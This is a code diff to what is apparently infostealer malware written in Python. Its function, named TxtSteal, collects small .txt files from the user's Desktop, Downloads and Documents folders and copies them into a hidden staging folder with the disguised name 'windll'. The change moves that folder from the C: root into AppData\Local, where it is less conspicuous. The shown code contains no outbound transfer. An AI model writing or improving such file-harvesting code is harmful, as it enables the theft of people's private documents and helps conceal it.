@@ -15,6 +15,7 @@ import shutil
 
 def TxtSteal():
 	try:
+		pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
 		desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
 		downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
 		documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
@@ -30,7 +31,7 @@ def TxtSteal():
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Desktop')
+				shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
@@ -45,7 +46,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Downloads')
+			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
 
 		def fromDocuments():
 			listoffiles = os.listdir(documents)
@@ -59,7 +60,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Documents')
+			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
@@ -85,7 +86,7 @@ def TxtSteal():
 				if size < 1000000:
 					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-				shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Desktop')
+				shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')
 
 
 		def fromDownloads():
@@ -100,7 +101,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Downloads')
+			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')
 
 		def fromDocuments():
 			listoffiles = os.listdir(documents)
@@ -114,7 +115,7 @@ def TxtSteal():
 			    if size < 1000000:
 			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
 			for i in range(0, len(finnalytxtfiles)):
-			    shutil.copy(finnalytxtfiles[i], r'C:\windll\DocumentFiles\Documents')
+			    shutil.copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
 		
 		fromDesktop()
 		fromDownloads()
